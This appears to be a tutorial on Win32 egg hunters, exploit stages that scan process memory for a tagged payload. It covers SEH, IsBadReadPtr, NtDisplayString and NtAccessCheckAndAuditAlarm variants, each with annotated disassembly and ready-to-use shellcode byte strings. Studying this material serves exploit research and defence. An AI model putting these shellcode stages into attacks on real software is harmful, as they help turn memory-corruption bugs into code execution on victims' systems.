Heap-Only Egg Hunter: http://r00tin.blogspot.com/2009/03/heap-only-egg-hunter.html

Win32 Egghunting

You just have to remember :
-	 The marker needs to be unique (Usually you need to define the tag as 4 bytes inside the egg hunter, and 2 times (2 times right after each other, so 8 bytes) prepended to the actual shellcode. 
-	You’ll have to test which technique to search memory works for a particular exploit.  (NTAccessCheckAndAuditAlarm seems to work best on my system) 
-	Each technique requires a given number of available space to host the egg hunter code :
o	SEH technique uses about 60 bytes.
o	IsBadReadPtr requires 37 bytes
o	NtDisplayString method uses 32 bytes.  (This last technique only works on NT derived versions of Windows. 

Windows Egghunters
-	SEH 
-	IsBadReadPtr
-	NtDisplayString 


There are two distinct methods by which the address space of a given process can be searched on Windows. 
1.	Take Advantage of a feature that is unique to Windows: Structured Exception Handling.
2.	Use the system call validation method that was also used on Linux. 

----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------

SEH:
The following implementation, while rather large, is an example of an egg hunter that installs its own exception handler and fixes up the execution path properly when an invalid address is encountered. Before diving into the analysis, perhaps a little bit of information on the subject of exception handlers would make sense.
To recap, Windows provides a mechanism by which process-relative exception handlers can be registered that can receive notifications regarding things like
access violations, breakpoints, floating point exceptions, and other such runtime errors. These handlers can be chained together, thus allowing for one handler to pass along the exception further down the chain if it does not need to or is unable to deal with the type of exception that has been encountered. These exception handlers are analogous to the C++ and Java exception handlers that are used when class methods throw exceptions to callers in order to pass error information up the stack.


EB21       jmp short 0x23
59         pop ecx
B890509050 mov eax,0x50905090  ; this is the tag
51         push ecx
6AFF       push byte -0x1
33DB       xor ebx,ebx
648923     mov [fs:ebx],esp
6A02       push byte +0x2
59         pop ecx
8BFB       mov edi,ebx
F3AF       repe scasd
7507       jnz 0x20
FFE7       jmp edi
6681CBFF0F or bx,0xfff
43         inc ebx
EBED       jmp short 0x10
E8DAFFFFFF call 0x2
6A0C       push byte +0xc
59         pop ecx
8B040C     mov eax,[esp+ecx]
B1B8       mov cl,0xb8
83040806   add dword [eax+ecx],byte +0x6
58         pop eax
83C410     add esp,byte+0x10
50         push eax
33C0       xor eax,eax
C3         ret

In order to use this egg hunter, your egg hunter payload must look like this :
my $egghunter = "\xeb\x21\x59\xb8".
"w00t".
"\x51\x6a\xff\x33\xdb\x64\x89\x23\x6a\x02\x59\x8b\xfb".
"\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb".
"\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1".
"\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x33\xc0\xc3";

(where w00t is the tag. You could write w00t as “\x77\x30\x30\x74” as well)

The egg hunter itself is broken into three basic parts. 
-	First part is the exception handler registration portion, 
-	Second part is the egg comparison code
-	Third part is the exception handler. 

1.	The first instruction that is executed is a relative jmp to a call instruction that immediately does a relative call backwards to the instruction right after the original jmp. This may seem unnecessary, but the purpose it serves is to push the address of the exception handler on the stack, and thus make it possible to know its address in a position independent fashion.
2.	The handler is then popped off the stack and into the ecx register
3.	The next step isn’t particularly related to the exception handler registration, but is necessary for the egg comparison phase of the egg hunter in that eax must be initialized with the four byte version of the egg that is being searched for
With the exception handlers absolute memory address stored in ecx, 

The next step is to build out a EXCEPTION REGISTRATION RECORD structure on the stack that will then be installed as the lowest handler in the chain, and thus be called before any others.

4.	This is accomplished by simply pushing the ecx register onto the stack to act as the Handler attribute and then pushing 0xffffffff to represent that there are no more exception handlers in the chain. The current stack pointer is then taken and stored at fs:[0], thus installing the custom exception handler.

After installing the exception handler, the next phase is to actually begin searching for the egg.

5.	first initializing the ebx register to zero.
a.	The ebx register is what will be used to hold the current address that is to be validated
6.	After that, the search loop begins.
7.	Inside the search loop the ecx register is initialized to two and the edi register is initialized to ebx.
a.	The reason that the ecx register is set to two is because it is used as the counter for the rep operation when doing the scasd.
b.	This allows for comparing eight bytes of memory at edi with the value stored in eax.
8.	In the event that edi points to an invalid address, the custom exception handler is triggered and the process’ current instruction pointer is updated to be six bytes past its current point, thus moving it to the page aligning portion of the egg hunter which then advances ebx by one page and starts going through the loop again
9.	Once the scasd operation succeeds, the egg hunter simply jumps into edi and begins executing the larger payload.

The exception handler itself is merely responsible for updating the current instruction pointer by a static adjustment whenever it is called.
The thought process here is that the only exceptions that should be getting triggered are those by the egg hunter itself. 
If any other exception were to be triggered, the static adjustment could potentially destabilize the application. 
Once it has updated the instruction pointer, the exception handler returns ExceptionContinueExecution so that execution can continue at the new position

----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------


IsBadReadPtr:
Second egghunter is smaller than the first.

IsBadReadPtr function simply installs its own exception handler and then dereferences the provided pointer for the given number of bytes to see if it can be read from. 
If the pointer cannot be read from, TRUE is returned, otherwise FALSE is returned and the pointer can be assumed to be valid, at least at that point in execution. 

The implementation will use IsBadReadPtr as a means to validate eight bytes of contiguous memory, much like the other implementations use system calls or their own custom exception handlers.

33DB       xor ebx,ebx
6681CBFF0F or bx,0xfff
43         inc ebx
6A08       push byte +0x8
53         push ebx
B80D5BE777 mov eax,0x77e75b0d
FFD0       call eax
85C0       test eax,eax
75EC       jnz 0x2
B890509050 mov eax,0x50905090 ; this is the tag
8BFB       mov edi,ebx
AF         scasd
75E7       jnz 0x7
AF         scasd
75E4       jnz0x7
FFE7       jmp edi

Egg hunter payload :
my $egghunter = "\x33\xdb\x66\x81\xcb\xff\x0f\x43\x6a\x08".
"\x53\xb8\x0d\x5b\xe7\x77\xff\xd0\x85\xc0\x75\xec\xb8".
"w00t".
"\x8b\xfb\xaf\x75\xe7\xaf\x75\xe4\xff\xe7";

1)	The registesr that contains the address to be validated is stored in ebx
2)	The now standard page alignment and incrementing instructions are found
3)	The main point of difference is that after them, instead of building out arguments for a system call in registers, arguments are pushed onto the stack for the call to IsBadReadPtr

4)	The second argument is pushed first as 0x8 which represents the ucb argument of the IsBadReadPtr function
5)	The first argument is pushed onto the stack as the contents of the ebx register which contains the address to be validated
6)	Finally, eax is set to the virtual memory address of the IsBadReadPtr and is called. 7

7)	Upon return, eax is tested to see if it is zero.
a.	If No:
i.	The virtual address in ebx is invalid and thus the page alignment branch is taken and the search continues
b.	If yes:
i.	the address is compared with the egg. 
ii.	If the egg does not match:
1.	 the single-byte branch is taken and the search continues
iii.	If the egg does match:
1.	the egg hunter simply jumps into edi and executes the larger payload


----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------

NtDisplayString
The third egg hunter implementation is limited to NT derived versions of Windows, but the concepts should be applicable 9X based versions as well. 

The actual system call that was used to accomplish the egg hunting operation was the NtDisplayString system call.

The NtDisplayString system call is typically used to display text to the bluescreen that some people are (unfortunately) all too familiar with. 

For the purposes of an egg hunter, however, it is abused due to the fact that its only argument is a pointer that is read from and not written to, thus making it a most desirable choice. The actual implementation varies little from the Linux implementations that use system calls (other than the obvious error code and system call number differences):

6681CAFF0F  or dx,0x0fff
42          inc edx
52          push edx
6A43        push byte +0x43
58          pop eax
CD2E        int 0x2e
3C05        cmp al,0x5
5A          pop edx
74EF        jz 0x0
B890509050  mov eax,0x50905090  ; this is the tag
8BFA        mov edi,edx
AF          scasd
75EA        jnz 0x5
AF          scasd
75E7        jnz 0x5
FFE7        jmp edi

Egg hunter payload :
my $egghunter =
"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
"w00t".
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";

-	the edx register is used as the register that holds the pointer that is to be validated throughout the course of the search operation.

----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------

Egg hunter using NtAccessCheck (AndAuditAlarm)

Another egg hunter that is very similar to the NtDisplayString hunter is this one :
my $egghunter =
"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
"\x77\x30\x30\x74". # this is the marker/tag: w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";
Instead of using NtDisplayString, it uses NtAccessCheckAndAuditAlarm (offset 0x02 in the KiServiceTable) to prevent access violations from taking over your egg hunter. More info about NtAccessCheck can be found here and here.  Also, my friend Lincoln created a nice video about this egg hunter :

